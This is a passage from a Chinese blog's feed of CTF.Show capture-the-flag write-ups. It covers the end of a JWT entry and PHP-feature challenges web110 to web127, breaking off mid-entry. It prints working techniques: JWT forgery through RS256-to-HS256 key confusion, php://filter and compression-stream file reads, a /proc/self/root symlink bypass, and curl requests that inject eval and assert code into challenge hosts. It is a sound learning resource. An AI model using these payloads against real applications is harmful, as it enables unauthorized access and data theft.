jwt.sign(&#123;<span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span>&#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;)</span><br><span class="line"><span class="built_in">console</span>.log(token)</span><br></pre></td></tr></table></figure><p>得到 token <code>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MzAxNjIwOTd9.npKuv9ByHR6GG5v6vVtpMcjBnfKvWKk2QpklGZEcdTvla_qNFxC6N8mjRTBE5pTUDtGLCthrUWI860hL0GfE6Yyj3hMhOvwP53KqXeGbcG4rwl3kslQ-q92TeeVoLgQW83-M855bEE5_dS_YQsVhJfqdaBKoh-j9gE2fX_bnqDI</code></p><p>同时，题目要求验证的时候使用 POST，丢到 burpsuite 里面一把梭</p><p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%207.png" alt="Untitled"></p><h1 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h1><h2 id="做题-5"><a href="#做题-5" class="headerlink" title="做题"></a>做题</h2><p>这题是一个白盒分析题，可以通过参数 env=development 来使其报出错误。由于压缩包里没有 private.key ，因此想要暴力破解密钥是不太可能的。同时，cookie中的auth参数提交到 index.js 后经由 jwt.verify 验证，如果 decoded 为undefined则校验失败。但经过测试，发现连它生成的jwt我直接post都没法进行到下一步，<del>所以我决定看wp</del></p><blockquote><p>通过将算法调整为HMAC变体（HS256/HS384/HS512）并使用公共可用公钥对其进行签名，我们可以欺骗服务使用机密变量中的硬编码公钥验证HMAC令牌。</p></blockquote><p>原来 JWT 在没有强制使用 RS256 的时候，还可以使用 public.key 与 HS256 来假装让它进行对称加密，真是tql。此处的public.key可以直接在网站上下载，直接输入 /public.key</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> privateKey = fs.readFileSync(<span class="string">&#x27;./public.key&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.sign(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="built_in">console</span>.log(token) <span class="comment">// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2MzAxOTg2NDJ9.7_3UAT5LFXNiPgdZCH80sQYvek-lQ88py8pb9lY9HHw</span></span><br></pre></td></tr></table></figure><p>这样下来，解题就很简单了，我们用公钥签名，然后直接把jwt交上去试试</p><p>按照代码，我们这里还需要使用 POST 方式来进行请求</p><p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%208.png" alt="Untitled"></p><h2 id="参考资料-3"><a href="#参考资料-3" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/solitudi/article/details/112525267">[CTFSHOW]JWT_Y4tacker的博客-CSDN博客_ctf jwt</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;JWT 的解密可以在此处完成，同时 JWT 由三部分组成：Header，Payload以及Secret，前两部分由base64编码，并且三个部分用 . 进行拼接&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://jwt.io/&quot;&gt;JWT.IO&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;web345&quot;&gt;&lt;a href=&quot;#web345&quot; class=&quot;headerlink&quot; title=&quot;web345&quot;&gt;&lt;/a&gt;web345&lt;/h1&gt;&lt;h2 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;JWT 的解码与使用&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;JWT 无密钥情况下可任意修改前方数据&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    <category term="CTF" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>【Klee-CTF】CTF.Show Web入门 PHP 特性 2 web110~web128</title>
    <link href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2.html"/>
    <id>https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-Feature-2.html</id>
    <published>2021-08-30T04:00:00.000Z</published>
    <updated>2021-08-30T12:28:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h1><p><code>PHP Version: 7.3.11</code></p><p>仍未解决</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>对 PHP 原生类的运用</li></ul><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>从这题可以看出，这里考察的是对PHP原生类和原生函数的结合运用，但由于我也没啥知识储备，所以还是得先翻一下资料，<del>顺便看一下hint</del></p><p>想写下列代码尝试一下，利用 FilesystemIterator 获取指定目录下的所有文件，但是不知道为什么只返回了一个文件名？为什么在这题就可以返回flag的txt，如果恰好flag的名字不在第一个怎么办？</p><span id="more"></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$b</span> = getcwd();</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p>令我更不明白的是，为什么我这里调用的是 web110.php，他给我返回了一个 web261.php？</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled.png" alt="Untitled"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.extrader.top/posts/35c0085d/">https://www.extrader.top/posts/35c0085d/</a>  php原生类利用</li><li><a href="https://www.php.net/manual/zh/refs.basic.other.php">https://www.php.net/manual/zh/refs.basic.other.php</a> PHP 基本扩展</li></ul><h1 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h1><p><code>PHP Version: 7.3.11</code></p><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul><li>变量覆盖</li></ul><h2 id="做题-1"><a href="#做题-1" class="headerlink" title="做题"></a>做题</h2><p>我原本想的是 v1 = ctfshow, v2 = flag 的，执行后发现为null，于是就逐个断点调试看看是什么情况。</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/screen.gif" alt="screen.gif"></p><p>可以看到，这个 $flag 进来以后就没了，那怎么办呢，其实 $flag 在外部已经被定义了，所以他算是一个全局变量，只要我们查看 GLOBALS 的值即可拿到 flag，也就是说 v1 写 ctfshow，v2 写 GLOBALS。</p><h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><p><code>PHP Version: 7.3.11</code></p><ul><li>函数绕过</li><li>PHP 伪协议读取文件</li></ul><h2 id="做题-2"><a href="#做题-2" class="headerlink" title="做题"></a>做题</h2><p>首先可以看到，这里面过滤了 ..|http|https|data|input|rot13|base64|string ，如果没有这个，可以考虑用 <a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a> 来绕过。其他绕过方式也可参考参考资料[1]。</p><p>然后我们看到 is_file($file) 这里做了一层判断，也就是说不能直接读取文件，不过我们可以借此判断是否存在文件。输入 /?file=/var/www/html/flag.php 返回 hacker! 代表存在该文件。</p><p>根据官方提示以及参考资料[2]，我们可以通过以下几种方式获取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure><p>前三种方式不乏都是通过 PHP 流过滤器加上各种转换（见参考资料[3]）与最终 resource=flag.php 拿到 flag，最后一种则是通过压缩流与调取本地文件拿到</p><p>并且看起来 read= 可以忽略，主要是看转换，更多过滤器可见参考资料 [4]</p><p>不过最后一种在 highlight_file 遇到以后是会自动解压吗？不是很懂</p><h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.cnblogs.com/wjrblogs/p/12285202.html">https://www.cnblogs.com/wjrblogs/p/12285202.html</a> CTF中常用的php伪协议利用</li><li><a href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a> php:// — 访问各个输入/输出流（I/O streams）</li><li><a href="https://www.php.net/manual/zh/filters.convert.php">https://www.php.net/manual/zh/filters.convert.php</a> 转换过滤器</li><li><a href="https://www.php.net/manual/zh/filters.php">https://www.php.net/manual/zh/filters.php</a> 可用过滤器列表</li><li><a href="https://www.php.net/manual/zh/wrappers.compression.php">https://www.php.net/manual/zh/wrappers.compression.php</a></li></ul><h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><p><code>PHP Version: 7.3.11</code></p><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul><li>函数绕过</li><li>PHP 压缩流协议使用</li><li>多次软链接绕过 is_file()</li></ul><h2 id="做题-3"><a href="#做题-3" class="headerlink" title="做题"></a>做题</h2><h3 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h3><p>细节其实和上题差不多，只不过 filter 被限制使用了，还是可以用压缩流来绕过。</p><p>但我不明白，为什么不能用 zip:// 和 bzip2:// ，只能用 zlib2:// ?</p><blockquote><p>zlib: 的功能类似 gzopen()，但是 <strong>其数据流还能被 fread() 和其他文件系统函数使用</strong>。 不建议使用，因为会和其他带“:”字符的文件名混淆； 请使用 compress.zlib:// 替代。</p></blockquote><p><a href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a></p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>经过20次软链接可以绕过 is_file()</p><p><code>/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p><p>原来还有 /proc/self/root 软链接这种方法，学到了</p><h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><p><code>PHP Version: 7.3.11</code></p><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul><li>函数绕过</li><li>PHP 伪协议读取文件</li></ul><h2 id="做题-4"><a href="#做题-4" class="headerlink" title="做题"></a>做题</h2><p>这题拦截了 compress，拦截了convert，但又不拦截 filter 了，奇怪。</p><p><code>php://filter/resource=flag.php</code></p><h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><p><code>PHP Version: 7.3.11</code></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:08:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul><li>通过 \f 绕过 is_numberic() 与 trim()</li></ul><h2 id="做题-5"><a href="#做题-5" class="headerlink" title="做题"></a>做题</h2><p>首先我们分析题目，此处将十六进制和八进制的方法给pass掉了，所以无法使用十六进制或八进制来直接绕过。其次，此处使用了 is_numeric 与 trim 来判断。is_numeric 用于判断是否为数字，通过 trim 过滤字符，trim 的语法见下</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled%201.png" alt="Untitled"></p><blockquote><p><strong>is_numeric函数在开始判断前，会先跳过所有空白字符。</strong>可是题目获取$req[‘number’]的时候明明使用trim过滤了空白字符这时候我们可以引入\f（也就是%0c）在数字前面，来绕过最后那个is_palindrome_number函数，而<strong>对于前面的数字判断，因为intval和is_numeric都会忽略这个字符，所以不会影响。</strong><br>————————————————<br>版权声明：本文为CSDN博主「EvilGenius-」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_36609913/article/details/79296052">https://blog.csdn.net/qq_36609913/article/details/79296052</a></p></blockquote><p>所以，我们只需要在36前面添加 %0c 即 \f 的 urlencode 即可绕过，</p><h2 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/qq_44657899/article/details/109731923">https://blog.csdn.net/qq_44657899/article/details/109731923</a> ctfshow-web115（\f绕过is_numberic()+trim()）</li><li><a href="https://blog.csdn.net/qq_36609913/article/details/79296052">https://blog.csdn.net/qq_36609913/article/details/79296052</a> PHP代码审计(绕过过滤的空白字符)</li></ul><h1 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h1><p><code>PHP Version: 7.4.9</code></p><h2 id="做题-6"><a href="#做题-6" class="headerlink" title="做题"></a>做题</h2><p>思路错了。。我一开始在想怎么给 fl0g 赋值为 flag_give_me，但完全没有想到在eval可以直接echo一个$flag。。。</p><p>我们按照代码的判断条件来操作，结果最后发现 POST 上去的小数点 . 被转换为了下划线 _</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled%202.png" alt="Untitled"></p><p><a href="https://www.php.net/manual/zh/language.variables.external.php">PHP: 来自 PHP 之外的变量 - Manual</a></p><blockquote><p>注意:<br>变量名中的点和空格被转换成下划线。例如 <input name="a.b" /> 变成了 $_REQUEST[“a_b”]。</p></blockquote><p>那有什么办法呢？结果后来发现，原来[也会被转换，PHP会将 [ 转换为 . 这不刚好应了我的意吗？</p><p><a href="https://segmentfault.com/a/1190000019633304?sort=votes">PHP 对输入变量名的自动转换的问题与源码分析</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=<span class="string">&quot;a.b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a_b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;a b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a_b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;a[b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a_b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;a]b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a]b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;a-b&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;a-b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot; ab&quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;ab&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;ab &quot;</span> /&gt;        转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;ab &quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a.b]&quot;</span> /&gt;   转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="string">&quot;a.b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;ar.r[a.b]&quot;</span> /&gt;  转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;ar_r&quot;</span>][<span class="string">&quot;a.b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a[b]]&quot;</span> /&gt;  转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="string">&quot;a[b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a[]x]&quot;</span> /&gt;  转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="string">&quot;a[&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[]ab&quot;</span> /&gt;    转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="number">0</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a]b&quot;</span> /&gt;    转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr&quot;</span>][<span class="string">&quot;a&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[a.b&quot;</span> /&gt;    转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr_a.b&quot;</span>]</span><br><span class="line">&lt;input name=<span class="string">&quot;arr[[a.b&quot;</span> /&gt;   转为: <span class="variable">$_REQUEST</span>[<span class="string">&quot;arr_[a.b&quot;</span>]</span><br></pre></td></tr></table></figure><p>按照题目，第一个 [ 会被置换为下划线，之后的.就不会被转换，因此该题中 CTF_SHOW.COM 的参数应为 CTF[SHOW.COM</p><p>所以最后请求参数为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://ef9d0de2-60eb-49b4-a94d-58f30c185f81.challenge.ctf.show:8080/&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;CTF_SHOW=&quot;1&quot;&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;CTF[SHOW.COM=&quot;1&quot;&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;fl0g=&quot;1&quot;&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;fun=&quot;echo $flag&quot;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="参考资料-3"><a href="#参考资料-3" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/weixin_45551083/article/details/110574834">https://blog.csdn.net/weixin_45551083/article/details/110574834</a> CTFShow web入门123-150 (php特性(二))</li><li><a href="https://www.freebuf.com/articles/web/261802.html">https://www.freebuf.com/articles/web/261802.html</a> php代码审计前奏之ctfshow之php特性</li><li><a href="https://www.php.net/manual/zh/language.variables.external.php">https://www.php.net/manual/zh/language.variables.external.php</a></li><li><a href="https://segmentfault.com/a/1190000019633304?sort=votes">https://segmentfault.com/a/1190000019633304?sort=votes</a></li></ul><h1 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h1><p><code>PHP Version: 7.4.9</code></p><h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul><li>在eval中调用函数，使用其他变量来绕过检查。</li></ul><h2 id="做题-7"><a href="#做题-7" class="headerlink" title="做题"></a>做题</h2><p>我们其实可以在eval的参数中再eval其他变量，例如这样： <code>eval($_GET[0])</code> ，然后再设置参数0为 <code>echo $flag;</code>，不就可以了嘛？</p><p>请求参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://99fb334d-dd4f-40a2-8baf-f0f0015d457f.challenge.ctf.show:8080/?0=echo $flag;&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;CTF_SHOW=&quot;1&quot;&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;CTF[SHOW.COM=&quot;1&quot;&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;fl0g=&quot;1&quot;&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;fun=&quot;eval($_GET[0])&quot;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h2><ul><li>使用 parse_str 将字符串解析成多个变量</li></ul><h2 id="做题-8"><a href="#做题-8" class="headerlink" title="做题"></a>做题</h2><p>草，前面没提到这个 <code>$a=$_SERVER[&#39;argv&#39;];</code> 我都忘了有这个东西了，还以为发挥作用的是 ?a=1+flag=xxx 这么厉害呢。。。</p><p>由题目，我们可以使用变量覆盖来使变量 $fl0g 的值为 flag_give_me ，但我们又不能直接传入 $_GET ，那怎么办呢？</p><p>刚好由 hint，我发现题目传入的参数是 /?a=1+fl0g=flag_give_me ，我还在好奇为什么不能用 &amp; 而需要用 + ，经过下面的分析就明白了。</p><p>使用 + 时，argv会被分成两个，分别为 <code>a=1</code> 以及 <code>fl0g=flag_give_me</code>，而此时 <code>$_GET</code> 只有一个数组成员。</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-Feature-2/Untitled%203.png" alt="Untitled"></p><p>但我使用 &amp; 时，argv还是回被分成2个，$_GET 此时就会变为两个，会被判断条件 <code>!isset($_GET[&#39;fl0g&#39;])</code> 所拦截。</p><h3 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h3><p>提交 fun 设置为 parse_str($a[1]) 即可获得flag，请求参数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://5f2c6d41-ccf6-48c6-a373-f554ec454ebd.challenge.ctf.show:8080/?a=1+fl0g=flag_give_me&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;CTF_SHOW=&quot;1&quot;&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;CTF[SHOW.COM=&quot;1&quot;&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;fl0g=&quot;1&quot;&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;fun=&quot;parse_str($a[1])&quot;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>这个函数的作用，有点类似于eval？但我就不明白了，<del>你小米把我内测资格取消掉，还把我的内测分把300多分扣到55分，你是傻的吗！</del></p><p><del>为什么eval不行？它碰撞到了哪个正则规则吗？</del></p><p><strong>在assert内允许不是分号结尾的语句，例如 assert(‘$a=test’);，但是eval内必须要为分号结尾，所以将assert改为eval时，还需要把 GET 参数 fl0g 中的flag_give_me 后面添加分号，这样就可以拿到flag了。</strong></p><p>请求参数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request POST <span class="string">&#x27;http://5f2c6d41-ccf6-48c6-a373-f554ec454ebd.challenge.ctf.show:8080/?$fl0g=flag_give_me&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;CTF_SHOW=&quot;1&quot;&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;CTF[SHOW.COM=&quot;1&quot;&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;fl0g=&quot;1&quot;&#x27;</span> \</span><br><span class="line">--form <span class="string">&#x27;fun=&quot;assert($a[0])&quot;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="参考资料-4"><a href="#参考资料-4" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.php.net/manual/zh/function.parse-str.php">https://www.php.net/manual/zh/function.parse-str.php</a> parse_str — 将字符串解析成多个变量</li><li><a href="https://www.php.net/manual/zh/function.assert.php">https://www.php.net/manual/zh/function.assert.php</a> assert — 检查一个断言是否为 false</li><li><a href="https://www.0x002.com/2018/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%8F%8A%E5%9C%A8webshell%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/">https://www.0x002.com/2018/变量覆盖漏洞学习及在webshell中的运用/</a></li></ul><h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><p><code>PHP Version: 7.3.11</code></p><h2 id="做题-9"><a href="#做题-9" class="headerlink" title="做题"></a>做题</h2><p>这里面， $_SERVER[‘QUERY_STRING’] 会提取出请求 URL 中 /? 后的参数，也就是 GET 参数的 urlencode 版。但是，由于下划线被waf阻止，我们似乎不能直接使 ctf_show 的值为 ilove36d 